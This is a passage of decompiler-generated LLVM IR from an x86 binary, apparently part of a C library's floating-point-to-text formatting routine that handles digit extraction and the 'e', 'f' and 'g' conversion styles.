bb183:                                            ; preds = %dec_label_pc_80625e4
  %v5_80625ef = fcmp olt x86_fp80 %v3_80625e7, %v1_80625f5
  br i1 %v5_80625ef, label %.thread51, label %bb184

.thread51:                                        ; preds = %bb183
  store x86_fp80 %v3_80625e7, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8062605

bb184:                                            ; preds = %bb183
  %not.v6_80625ef = fcmp une x86_fp80 %v3_80625e7, %v1_80625f5
  store x86_fp80 %v3_80625e7, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_80625ef, label %dec_label_pc_8062605, label %dec_label_pc_80625f5

dec_label_pc_80625f5:                             ; preds = %.thread55, %bb184
  store x86_fp80 %v3_80625e7, x86_fp80* %st1.global-to-local, align 4
  %v5_80625ff = add i32 %stack_var_-220.0, %v0_806260b
  br label %dec_label_pc_8062607

dec_label_pc_8062605:                             ; preds = %dec_label_pc_80625c1, %.thread51, %bb184
  %v1_8062605 = phi x86_fp80 [ %v1_80625f5, %.thread51 ], [ %v1_80625f5, %bb184 ], [ %v3_80625c6, %dec_label_pc_80625c1 ]
  %v0_80625ba80 = phi x86_fp80 [ %v3_80625e7, %.thread51 ], [ %v3_80625e7, %bb184 ], [ %v4_80625cc, %dec_label_pc_80625c1 ]
  store x86_fp80 %v1_8062605, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8062607

dec_label_pc_8062607:                             ; preds = %dec_label_pc_80625f5, %dec_label_pc_80625d4, %dec_label_pc_8062605
  %v2_80625bd81 = phi x86_fp80 [ %v1_8062605, %dec_label_pc_8062605 ], [ %v2_80625bd, %dec_label_pc_80625f5 ], [ %v1_80625f5, %dec_label_pc_80625d4 ]
  %v0_80625ba79 = phi x86_fp80 [ %v0_80625ba80, %dec_label_pc_8062605 ], [ %v3_80625e7, %dec_label_pc_80625f5 ], [ %v4_80625cc, %dec_label_pc_80625d4 ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_8062605 ], [ %v5_80625ff, %dec_label_pc_80625f5 ], [ %v5_80625de, %dec_label_pc_80625d4 ]
  %v1_8062607 = icmp eq i32 %v1_80625bc, 0
  br i1 %v1_8062607, label %.thread60, label %dec_label_pc_806260b

dec_label_pc_806260b:                             ; preds = %dec_label_pc_8062607
  %v2_806260b = sdiv i32 %v0_806260b, 2
  store i32 %v2_806260b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80625ba

.thread60:                                        ; preds = %dec_label_pc_8062607
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_806262f

dec_label_pc_806262f:                             ; preds = %dec_label_pc_8062512, %.thread60
  %v0_80626e9 = phi i32 [ %stack_var_-220.1, %.thread60 ], [ -1, %dec_label_pc_8062512 ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread60 ], [ 0xK3FFF8000000000000000, %dec_label_pc_8062512 ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_8062633 = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_806250a, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_8062646 = and i32 %v2_8062633, -65536
  %v1_806264b = udiv i16 %tmp146, 256
  %v2_806264b = zext i16 %v1_806264b to i32
  %v3_806264b = or i32 %v2_806264b, 12
  %v10_806264b = mul nuw nsw i32 %v3_806264b, 256
  %tmp194 = urem i16 %tmp146, 256
  %v4_8062646.masked = zext i16 %tmp194 to i32
  %v11_806264b = or i32 %v10_806264b, %v4_8062646.masked
  %v12_806264b = or i32 %v11_806264b, %v6_8062646
  store i32 %v12_806264b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062653

dec_label_pc_8062653:                             ; preds = %dec_label_pc_80626a5.dec_label_pc_8062653_crit_edge, %dec_label_pc_806262f
  %v2_8062678 = phi x86_fp80 [ %storemerge, %dec_label_pc_806262f ], [ %v2_8062678.pre, %dec_label_pc_80626a5.dec_label_pc_8062653_crit_edge ]
  %v1_8062653 = phi i3 [ %v1_806250a, %dec_label_pc_806262f ], [ %v1_8062653.pre, %dec_label_pc_80626a5.dec_label_pc_8062653_crit_edge ]
  %v3_806267a = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_806262f ], [ %v0_8062653.pre, %dec_label_pc_80626a5.dec_label_pc_8062653_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_8062633, %dec_label_pc_806262f ], [ %v4_8062673, %dec_label_pc_80626a5.dec_label_pc_8062653_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp195 = fptosi x86_fp80 %v3_806267a to i32
  store i32 %tmp195, i32* %eax.global-to-local, align 4
  store i32 %tmp195, i32* %ecx.global-to-local, align 4
  %v5_806266d = sitofp i32 %tmp195 to x86_fp80
  %v4_8062673 = add i32 %stack_var_-212.0, 9
  %v4_8062678 = fsub x86_fp80 %v2_8062678, %v5_806266d
  store i3 %v1_8062653, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_806267a = fmul x86_fp80 %v3_806267a, %v4_8062678
  store x86_fp80 %v4_806267a, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_806267c

dec_label_pc_806267c:                             ; preds = %dec_label_pc_806267c.dec_label_pc_806267c_crit_edge, %dec_label_pc_8062653
  %v0_8062690 = phi i32 [ %v0_8062690.pre, %dec_label_pc_806267c.dec_label_pc_806267c_crit_edge ], [ %tmp195, %dec_label_pc_8062653 ]
  %v0_8062680 = phi i32 [ %v0_8062680.pre, %dec_label_pc_806267c.dec_label_pc_806267c_crit_edge ], [ 0, %dec_label_pc_8062653 ]
  %v1_8062680 = add i32 %v0_8062680, 1
  store i32 %v1_8062680, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_806268a = sub i32 %v4_8062673, %v1_8062680
  %div = udiv i32 %v0_8062690, 10
  %tmp185 = urem i32 %v0_8062690, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_8062696 = and i32 %div, 536870656
  store i32 %v2_806268a, i32* %edx.global-to-local, align 4
  %v1_806269c = trunc i32 %tmp185 to i8
  %v2_806269c = or i8 %v1_806269c, 48
  %v12_806269c = zext i8 %v2_806269c to i32
  %v15_806269c = or i32 %v12_806269c, %v3_8062696
  store i32 %v15_806269c, i32* %eax.global-to-local, align 4
  %v3_80626a1 = inttoptr i32 %v2_806268a to i8*
  store i8 %v2_806269c, i8* %v3_80626a1, align 1
  %v7_80626a3 = icmp sgt i32 %v1_8062680, 8
  br i1 %v7_80626a3, label %dec_label_pc_80626a5, label %dec_label_pc_806267c.dec_label_pc_806267c_crit_edge

dec_label_pc_806267c.dec_label_pc_806267c_crit_edge: ; preds = %dec_label_pc_806267c
  %v0_8062680.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8062690.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_806267c

dec_label_pc_80626a5:                             ; preds = %dec_label_pc_806267c
  %v0_80626a5 = load i32, i32* @edi, align 4
  %v1_80626a5 = add i32 %v0_80626a5, 1
  store i32 %v1_80626a5, i32* @edi, align 4
  %v7_80626a9 = icmp sgt i32 %v1_80626a5, 2
  br i1 %v7_80626a9, label %dec_label_pc_80626ab, label %dec_label_pc_80626a5.dec_label_pc_8062653_crit_edge

dec_label_pc_80626a5.dec_label_pc_8062653_crit_edge: ; preds = %dec_label_pc_80626a5
  %v0_8062653.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_8062653.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8062678.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8062653

dec_label_pc_80626ab:                             ; preds = %dec_label_pc_80626a5
  %v0_80626ab = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80626ab = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_80626ab, x86_fp80* %st0.global-to-local, align 4
  %v2_80626ad = add i3 %v0_80626ab, 2
  store i3 %v2_80626ad, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80626af = add i8 %stack_var_-207.0, -96
  %v6_80626af = sub i8 95, %stack_var_-207.0
  %v7_80626af = and i8 %v6_80626af, %stack_var_-207.0
  %v8_80626af = icmp slt i8 %v7_80626af, 0
  %v9_80626af = icmp eq i8 %v4_80626af, 0
  %v10_80626af = icmp slt i8 %v4_80626af, 0
  %v3_80626b4 = icmp eq i1 %v10_80626af, %v8_80626af
  %v4_80626b4 = icmp eq i1 %v9_80626af, false
  %v5_80626b4 = and i1 %v4_80626b4, %v3_80626b4
  br i1 %v5_80626b4, label %dec_label_pc_80626c3, label %dec_label_pc_80626b6

dec_label_pc_80626b6:                             ; preds = %dec_label_pc_80626ab
  %v4_80626b6 = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_80626c3

dec_label_pc_80626c3:                             ; preds = %dec_label_pc_80626ab, %dec_label_pc_80626b6
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_80626ab ], [ %v4_80626b6, %dec_label_pc_80626b6 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_80626ab ], [ 69, %dec_label_pc_80626b6 ]
  %v12_80626c3 = icmp eq i8 %stack_var_-207.1, 103
  %v1_80626c8 = icmp eq i1 %v12_80626c3, false
  br i1 %v1_80626c8, label %dec_label_pc_80626d1, label %dec_label_pc_80626ca

dec_label_pc_80626ca:                             ; preds = %dec_label_pc_80626c3
  %v0_80626ca = load i32, i32* %ebp.global-to-local, align 4
  %tmp186 = icmp slt i32 %v0_80626ca, 1
  br i1 %tmp186, label %dec_label_pc_80626d8, label %dec_label_pc_80626ce

dec_label_pc_80626ce:                             ; preds = %dec_label_pc_80626ca
  %v1_80626ce = add i32 %v0_80626ca, -1
  store i32 %v1_80626ce, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80626d8

dec_label_pc_80626d1:                             ; preds = %dec_label_pc_80626c3
  %v12_80626d1 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v12_80626d1, label %dec_label_pc_80626dc, label %dec_label_pc_80626d1.dec_label_pc_80626d8_crit_edge

dec_label_pc_80626d1.dec_label_pc_80626d8_crit_edge: ; preds = %dec_label_pc_80626d1
  %v0_80626d8.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80626d8

dec_label_pc_80626d8:                             ; preds = %dec_label_pc_80626d1.dec_label_pc_80626d8_crit_edge, %dec_label_pc_80626ca, %dec_label_pc_80626ce
  %v0_80626d8 = phi i32 [ %v0_80626d8.pre, %dec_label_pc_80626d1.dec_label_pc_80626d8_crit_edge ], [ %v0_80626ca, %dec_label_pc_80626ca ], [ %v1_80626ce, %dec_label_pc_80626ce ]
  store i32 %v0_80626d8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8062709

dec_label_pc_80626dc:                             ; preds = %dec_label_pc_80626d1
  store i32 %v0_80626e9, i32* %eax.global-to-local, align 4
  %v0_80626e0 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80626e0 = add i32 %v0_80626e0, %v0_80626e9
  store i32 %v2_80626e0, i32* %ebx.global-to-local, align 4
  %v5_80626e7 = icmp slt i32 %v2_80626e0, -1
  br i1 %v5_80626e7, label %dec_label_pc_80626e9, label %dec_label_pc_8062709

dec_label_pc_80626e9:                             ; preds = %dec_label_pc_80626dc
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80626f1 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_80626f1, i32* %eax.global-to-local, align 4
  %v4_80626f9 = bitcast i32* %stack_var_-72 to i8*
  %v5_80626f9 = call i32 @__GI_memset(i8* %v4_80626f9, i32 48, i32 21)
  store i32 %v5_80626f9, i32* %eax.global-to-local, align 4
  %v0_8062709.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8062709

dec_label_pc_8062709:                             ; preds = %dec_label_pc_80626dc, %dec_label_pc_80626e9, %dec_label_pc_80626d8
  %v1_8062729 = phi i32 [ %v0_80626d8, %dec_label_pc_80626d8 ], [ %v2_80626e0, %dec_label_pc_80626dc ], [ %v0_8062709.pr.pre, %dec_label_pc_80626e9 ]
  %stack_var_-220.3 = phi i32 [ %v0_80626e9, %dec_label_pc_80626d8 ], [ %v0_80626e9, %dec_label_pc_80626dc ], [ -1, %dec_label_pc_80626e9 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_806271c = icmp sgt i32 %v1_8062729, 20
  br i1 %v7_806271c, label %dec_label_pc_806271e, label %dec_label_pc_8062729

dec_label_pc_806271e:                             ; preds = %dec_label_pc_8062709
  %v2_806271e = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_806271e, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_806273d.preheader

dec_label_pc_8062729:                             ; preds = %dec_label_pc_8062709
  %v0_8062729 = load i32, i32* @esp, align 4
  %v2_8062729 = add i32 %v1_8062729, 165
  %v3_8062729 = add i32 %v2_8062729, %v0_8062729
  store i32 %v3_8062729, i32* %eax.global-to-local, align 4
  %v1_8062730 = add i32 %v3_8062729, 2
  %v2_8062730 = inttoptr i32 %v1_8062730 to i8*
  %v3_8062730 = load i8, i8* %v2_8062730, align 1
  %v4_8062730 = add i8 %v3_8062730, -53
  %v9_8062730 = sub i8 52, %v3_8062730
  %v10_8062730 = and i8 %v9_8062730, %v3_8062730
  %v11_8062730 = icmp slt i8 %v10_8062730, 0
  %v13_8062730 = icmp slt i8 %v4_8062730, 0
  store i32 %v1_8062730, i32* %ecx.global-to-local, align 4
  %v2_8062737 = icmp eq i1 %v13_8062730, %v11_8062730
  %v3_8062737 = zext i1 %v2_8062737 to i32
  br label %dec_label_pc_806273d.preheader

dec_label_pc_806273d.preheader:                   ; preds = %dec_label_pc_8062729, %dec_label_pc_806271e
  %v0_806273d102 = phi i32 [ %v1_8062730, %dec_label_pc_8062729 ], [ %v2_806271e, %dec_label_pc_806271e ]
  %storemerge71 = phi i32 [ %v3_8062737, %dec_label_pc_8062729 ], [ 0, %dec_label_pc_806271e ]
  store i32 %storemerge71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806273d

dec_label_pc_806273d:                             ; preds = %dec_label_pc_806273d.backedge, %dec_label_pc_806273d.preheader
  %v3_806273e = phi i32 [ %v3_806273e.pre, %dec_label_pc_806273d.backedge ], [ %storemerge71, %dec_label_pc_806273d.preheader ]
  %v0_806273d = phi i32 [ %v0_8062740, %dec_label_pc_806273d.backedge ], [ %v0_806273d102, %dec_label_pc_806273d.preheader ]
  %v1_806273d = add i32 %v0_806273d, -1
  store i32 %v1_806273d, i32* %ecx.global-to-local, align 4
  %v1_806273e = inttoptr i32 %v1_806273d to i8*
  %v2_806273e = load i8, i8* %v1_806273e, align 1
  %v4_806273e = trunc i32 %v3_806273e to i8
  %v5_806273e = add i8 %v2_806273e, %v4_806273e
  store i8 %v5_806273e, i8* %v1_806273e, align 1
  %v0_8062740 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8062740 = inttoptr i32 %v0_8062740 to i8*
  %v2_8062740 = load i8, i8* %v1_8062740, align 1
  %v3_8062740 = zext i8 %v2_8062740 to i32
  %v4_8062740 = load i32, i32* %edx.global-to-local, align 4
  %v5_8062740 = and i32 %v4_8062740, -256
  %v6_8062740 = or i32 %v5_8062740, %v3_8062740
  store i32 %v6_8062740, i32* %edx.global-to-local, align 4
  %v7_8062742 = icmp eq i8 %v2_8062740, 48
  br i1 %v7_8062742, label %dec_label_pc_806273d.backedge, label %dec_label_pc_8062747

dec_label_pc_806273d.backedge:                    ; preds = %dec_label_pc_806273d, %dec_label_pc_8062747
  %v3_806273e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806273d

dec_label_pc_8062747:                             ; preds = %dec_label_pc_806273d
  %v2_8062747 = add i8 %v2_8062740, -57
  %v7_8062747 = sub i8 56, %v2_8062740
  %v8_8062747 = and i8 %v7_8062747, %v2_8062740
  %v9_8062747 = icmp slt i8 %v8_8062747, 0
  %v10_8062747 = icmp eq i8 %v2_8062747, 0
  %v11_8062747 = icmp slt i8 %v2_8062747, 0
  %v3_806274a = icmp eq i1 %v11_8062747, %v9_8062747
  %v4_806274a = icmp eq i1 %v10_8062747, false
  %v5_806274a = and i1 %v4_806274a, %v3_806274a
  br i1 %v5_806274a, label %dec_label_pc_806273d.backedge, label %dec_label_pc_806274c

dec_label_pc_806274c:                             ; preds = %dec_label_pc_8062747
  %v2_806274c = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_806274c, i32* %eax.global-to-local, align 4
  %tmp196 = icmp ugt i32 %v0_8062740, %v2_806274c
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp196, label %dec_label_pc_8062757, label %dec_label_pc_8062764

dec_label_pc_8062757:                             ; preds = %dec_label_pc_806274c
  store i32 %v2_8062633, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_806276d

dec_label_pc_8062764:                             ; preds = %dec_label_pc_806274c
  store i32 %v2_806274c, i32* %edx.global-to-local, align 4
  store i32 %v2_806274c, i32* %ecx.global-to-local, align 4
  %v1_806276c = add i32 %stack_var_-220.3, 1
  store i32 %v1_806276c, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_806276d

dec_label_pc_806276d:                             ; preds = %dec_label_pc_8062757, %dec_label_pc_8062764
  %v0_806276d = phi i32 [ %v0_8062740, %dec_label_pc_8062757 ], [ %v2_806274c, %dec_label_pc_8062764 ]
  %v1_806276d = add i32 %v0_806276d, 1
  store i32 %v1_806276d, i32* %eax.global-to-local, align 4
  %v2_8062774 = inttoptr i32 %v1_806276d to i8*
  store i8 0, i8* %v2_8062774, align 1
  br i1 %v1_80626c8, label %dec_label_pc_806279a, label %dec_label_pc_806277f

dec_label_pc_806277f:                             ; preds = %dec_label_pc_806276d
  %v0_806277f = load i32, i32* %esi.global-to-local, align 4
  %v5_8062782 = icmp slt i32 %v0_806277f, -4
  br i1 %v5_8062782, label %dec_label_pc_80627a7, label %dec_label_pc_8062784

dec_label_pc_8062784:                             ; preds = %dec_label_pc_806277f
  %v1_8062784 = load i32, i32* %ebx.global-to-local, align 4
  %v7_8062786 = icmp slt i32 %v1_8062784, %v0_806277f
  br i1 %v7_8062786, label %dec_label_pc_80627a7, label %dec_label_pc_806278f

dec_label_pc_806278f:                             ; preds = %dec_label_pc_8062784
  %v2_8062791 = sub i32 %v1_8062784, %v0_806277f
  store i32 %v2_8062791, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80627ab

dec_label_pc_806279a:                             ; preds = %dec_label_pc_806276d
  %v4_806279a = zext i8 %stack_var_-207.1 to i32
  %v5_806279a = load i32, i32* %ebx.global-to-local, align 4
  %v6_806279a = and i32 %v5_806279a, -256
  %v7_806279a = or i32 %v6_806279a, %v4_806279a
  store i32 %v7_806279a, i32* %ebx.global-to-local, align 4
  %v10_806279e = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_806279e, label %dec_label_pc_806279a.dec_label_pc_80627ab_crit_edge, label %dec_label_pc_80627a7

dec_label_pc_806279a.dec_label_pc_80627ab_crit_edge: ; preds = %dec_label_pc_806279a
  %v0_80627ab.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80627ab

dec_label_pc_80627a7:                             ; preds = %dec_label_pc_806277f, %dec_label_pc_8062784, %dec_label_pc_806279a
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_806279a ], [ 103, %dec_label_pc_8062784 ], [ 103, %dec_label_pc_806277f ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80627b5

dec_label_pc_80627ab:                             ; preds = %dec_label_pc_806279a.dec_label_pc_80627ab_crit_edge, %dec_label_pc_806278f
  %v0_80627ad = phi i32 [ %v0_80627ab.pre, %dec_label_pc_806279a.dec_label_pc_80627ab_crit_edge ], [ %v0_806277f, %dec_label_pc_806278f ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_806279a.dec_label_pc_80627ab_crit_edge ], [ 102, %dec_label_pc_806278f ]
  %v2_80627ab = icmp slt i32 %v0_80627ad, 0
  store i32 %v0_80627ad, i32* %ebx.global-to-local, align 4
  %v1_80627af = icmp eq i1 %v2_80627ab, false
  br i1 %v1_80627af, label %dec_label_pc_80627b5, label %dec_label_pc_80627b1

dec_label_pc_80627b1:                             ; preds = %dec_label_pc_80627ab
  %v0_80627b1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80627b1 = add i32 %v0_80627b1, -1
  store i32 %v1_80627b1, i32* %edx.global-to-local, align 4
  %v1_80627b2 = inttoptr i32 %v1_80627b1 to i8*
  store i8 48, i8* %v1_80627b2, align 1
  %v0_80627ea.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80627b5

dec_label_pc_80627b5:                             ; preds = %dec_label_pc_80627ab, %dec_label_pc_80627a7, %dec_label_pc_80627b1
  %v1_8062845 = phi i32 [ %v0_80627ad, %dec_label_pc_80627ab ], [ %v0_80627ea.pre, %dec_label_pc_80627b1 ], [ 0, %dec_label_pc_80627a7 ]
  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_80627ab ], [ %stack_var_-197.1, %dec_label_pc_80627b1 ], [ %stack_var_-197.0, %dec_label_pc_80627a7 ]
  %v2_80627b5 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_80627b5, i32* %eax.global-to-local, align 4
  %v0_80627c4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80627c4 = add i32 %v0_80627c4, 1
  store i32 %v1_80627c4, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_80627d3 = inttoptr i32 %v0_80627c4 to i8*
  %v2_80627d3 = load i8, i8* %v1_80627d3, align 1
  %v3_80627d3 = zext i8 %v2_80627d3 to i32
  %v5_80627d3 = and i32 %v2_80627b5, -256
  %v6_80627d3 = or i32 %v3_80627d3, %v5_80627d3
  store i32 %v6_80627d3, i32* %eax.global-to-local, align 4
  store i32 %v6_80627d3, i32* %stack_var_-22, align 4
  %v2_80627e8 = sub i32 %v1_806276d, %v1_80627c4
  store i32 %v2_80627e8, i32* %edx.global-to-local, align 4
  %v1_80627ea = icmp eq i32 %v1_8062845, 0
  %v2_80627ea = icmp slt i32 %v1_8062845, 0
  br i1 %v2_80627ea, label %dec_label_pc_8062839, label %dec_label_pc_80627ee

dec_label_pc_80627ee:                             ; preds = %dec_label_pc_80627b5
  %v2_80627ee = sub i32 %v1_8062845, %v2_80627e8
  %v8_80627ee = xor i32 %v2_80627e8, %v1_8062845
  %v9_80627ee = xor i32 %v2_80627ee, %v1_8062845
  %v10_80627ee = and i32 %v9_80627ee, %v8_80627ee
  %v11_80627ee = icmp slt i32 %v10_80627ee, 0
  %v13_80627ee = icmp slt i32 %v2_80627ee, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_80627fc = icmp eq i1 %v13_80627ee, %v11_80627ee
  br i1 %v2_80627fc, label %dec_label_pc_80627fe, label %dec_label_pc_8062832

dec_label_pc_80627fe:                             ; preds = %dec_label_pc_80627ee
  store i32 %v2_80627ee, i32* %eax.global-to-local, align 4
  %tmp187 = icmp slt i32 %v2_80627ee, 1
  %tmp188 = icmp eq i1 %tmp187, false
  br i1 %tmp188, label %dec_label_pc_8062813, label %dec_label_pc_806282e

dec_label_pc_8062813:                             ; preds = %dec_label_pc_80627fe
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_806282e

dec_label_pc_806282e:                             ; preds = %dec_label_pc_80627fe, %dec_label_pc_8062813
  %storemerge28.in = phi i32* [ %stack_var_-120, %dec_label_pc_8062813 ], [ %stack_var_-132, %dec_label_pc_80627fe ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge28 = ptrtoint i32* %storemerge28.in to i32
  store i32 %storemerge28, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_806284e

dec_label_pc_8062832:                             ; preds = %dec_label_pc_80627ee
  %v4_8062834 = icmp eq i1 %v1_80627ea, false
  br i1 %v4_8062834, label %dec_label_pc_806283f, label %dec_label_pc_8062836

dec_label_pc_8062836:                             ; preds = %dec_label_pc_8062832
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8062839

dec_label_pc_8062839:                             ; preds = %dec_label_pc_80627b5, %dec_label_pc_8062836
  %v0_8062881112 = phi i32 [ %v1_8062845, %dec_label_pc_80627b5 ], [ -1, %dec_label_pc_8062836 ]
  %v2_8062839 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8062839, i32* @ecx, align 4
  br label %dec_label_pc_806284e

dec_label_pc_806283f:                             ; preds = %dec_label_pc_8062832
  %v2_8062843 = add i32 %v1_80627c4, %v1_8062845
  store i32 %v2_8062843, i32* %edi.global-to-local, align 4
  %v2_8062845 = sub i32 %v2_80627e8, %v1_8062845
  store i32 %v2_8062845, i32* %edx.global-to-local, align 4
  %v2_8062847 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8062847, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_806284e

dec_label_pc_806284e:                             ; preds = %dec_label_pc_8062839, %dec_label_pc_806282e, %dec_label_pc_806283f
  %v0_8062881111 = phi i32 [ %v0_8062881112, %dec_label_pc_8062839 ], [ -1, %dec_label_pc_806282e ], [ -1, %dec_label_pc_806283f ]
  %v0_806286a = phi i32 [ %v2_8062839, %dec_label_pc_8062839 ], [ %storemerge28, %dec_label_pc_806282e ], [ %v2_8062847, %dec_label_pc_806283f ]
  %v0_806285b = phi i32 [ %v2_80627e8, %dec_label_pc_8062839 ], [ 0, %dec_label_pc_806282e ], [ %v2_8062845, %dec_label_pc_806283f ]
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v2_8062855 = inttoptr i32 %v1_80624cb to i8*
  %v3_8062855 = load i8, i8* %v2_8062855, align 1
  %v4_8062855 = and i8 %v3_8062855, 16
  %v5_8062855 = icmp eq i8 %v4_8062855, 0
  %v1_8062859 = icmp eq i1 %v5_8062855, false
  br i1 %v1_8062859, label %dec_label_pc_806286a, label %dec_label_pc_806285b

dec_label_pc_806285b:                             ; preds = %dec_label_pc_806284e
  %v1_806285b = icmp eq i32 %v0_806285b, 0
  %v1_806285d = icmp eq i1 %v1_806285b, false
  br i1 %v1_806285d, label %dec_label_pc_806286a, label %dec_label_pc_806285f

dec_label_pc_806285f:                             ; preds = %dec_label_pc_806285b
  br i1 %v12_80626c3, label %dec_label_pc_8062881, label %dec_label_pc_8062866

dec_label_pc_8062866:                             ; preds = %dec_label_pc_806285f
  %v0_8062866 = load i32, i32* %ebp.global-to-local, align 4
  %tmp189 = icmp slt i32 %v0_8062866, 1
  br i1 %tmp189, label %dec_label_pc_8062881, label %dec_label_pc_806286a

dec_label_pc_806286a:                             ; preds = %dec_label_pc_8062866, %dec_label_pc_806285b, %dec_label_pc_806284e
  %v1_806286a = inttoptr i32 %v0_806286a to i32*
  store i32 112, i32* %v1_806286a, align 4
  %v0_8062870 = load i32, i32* @ecx, align 4
  %v1_8062870 = add i32 %v0_8062870, 4
  %v2_8062870 = inttoptr i32 %v1_8062870 to i32*
  store i32 1, i32* %v2_8062870, align 4
  %v0_8062877 = load i32, i32* @ecx, align 4
  %v1_8062877 = add i32 %v0_8062877, 8
  %v2_8062877 = inttoptr i32 %v1_8062877 to i32*
  store i32 ptrtoint (i32* @global_var_806ee80.740 to i32), i32* %v2_8062877, align 4
  %v0_806287e = load i32, i32* @ecx, align 4
  %v1_806287e = add i32 %v0_806287e, 12
  store i32 %v1_806287e, i32* @ecx, align 4
  %v0_8062881.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8062881

dec_label_pc_8062881:                             ; preds = %dec_label_pc_8062866, %dec_label_pc_806285f, %dec_label_pc_806286a
  %v0_8062888 = phi i32 [ %v0_806286a, %dec_label_pc_8062866 ], [ %v0_806286a, %dec_label_pc_806285f ], [ %v1_806287e, %dec_label_pc_806286a ]
  %v0_8062881 = phi i32 [ %v0_8062881111, %dec_label_pc_8062866 ], [ %v0_8062881111, %dec_label_pc_806285f ], [ %v0_8062881.pre, %dec_label_pc_806286a ]
  %v1_8062881 = add i32 %v0_8062881, 1
  %v8_8062881 = icmp eq i32 %v1_8062881, 0
  store i32 %v1_8062881, i32* %ebx.global-to-local, align 4
  br i1 %v8_8062881, label %dec_label_pc_806289b, label %dec_label_pc_8062884

dec_label_pc_8062884:                             ; preds = %dec_label_pc_8062881
  %v1_8062886 = sub i32 -1, %v0_8062881
  store i32 %v1_8062886, i32* %eax.global-to-local, align 4
  %v1_8062888 = inttoptr i32 %v0_8062888 to i32*
  store i32 176, i32* %v1_8062888, align 4
  %v0_806288e = load i32, i32* %eax.global-to-local, align 4
  %v1_806288e = load i32, i32* @ecx, align 4
  %v2_806288e = add i32 %v1_806288e, 4
  %v3_806288e = inttoptr i32 %v2_806288e to i32*
  store i32 %v0_806288e, i32* %v3_806288e, align 4
  %v0_8062891 = load i32, i32* @ecx, align 4
  %v1_8062891 = add i32 %v0_8062891, 8
  %v2_8062891 = inttoptr i32 %v1_8062891 to i32*
